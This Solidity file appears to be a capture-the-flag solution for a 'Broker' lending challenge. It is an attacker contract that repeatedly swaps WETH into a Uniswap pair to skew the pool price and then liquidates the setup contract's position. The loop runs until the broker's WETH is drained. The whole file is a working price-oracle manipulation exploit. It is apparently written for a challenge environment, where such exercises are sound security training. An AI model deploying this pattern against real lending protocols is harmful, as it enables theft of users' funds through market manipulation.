pragma solidity 0.8.0;

import "./Setup.sol";
import "hardhat/console.sol";

interface IUniswapRouter02{
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
}

contract BrokerAttackerIballes{

    Setup private setup;
    Broker private broker;
    IUniswapV2Pair private pair;
    IUniswapRouter02 private router;
    WETH9 private weth;
    Token private token;

    uint256 private attackDebt;
    uint256 constant DECIMALS = 1 ether;

    constructor(address _setup){
        setup = Setup(_setup);
        broker = Broker(setup.broker());
        pair = IUniswapV2Pair(setup.pair());
        router = IUniswapRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        weth = WETH9(setup.weth());
        token = Token(setup.token());
    }

    function attack() external payable{
        weth.deposit{value: msg.value}();

        console.log(weth.balanceOf(address(this)));

        while(weth.balanceOf(address(broker)) > 5 ether){
            swapWETH();
            liquidate();
            console.log(weth.balanceOf(address(broker)));
        }
    }

    function liquidate() public{
        uint256 liqAmount = broker.debt(address(setup)) - broker.safeDebt(address(setup));
        require(liqAmount > 0, "cannot liquidate");
        token.approve(address(broker), liqAmount);
        uint256 received = broker.liquidate(address(setup), liqAmount);
    }

    function swapWETH() public {
        (uint a0, uint a1,) = pair.getReserves(); 
        uint tokensAmount = router.getAmountOut(weth.balanceOf(address(this)), a1, a0);
        uint needed = weth.balanceOf(address(this)); //router.getAmountIn(tokensAmount, a1, a0);
        weth.approve(address(pair), needed);
        weth.transfer(address(pair), needed);
        pair.swap(tokensAmount, 0, address(this), "");
    }


    receive() external payable {}
}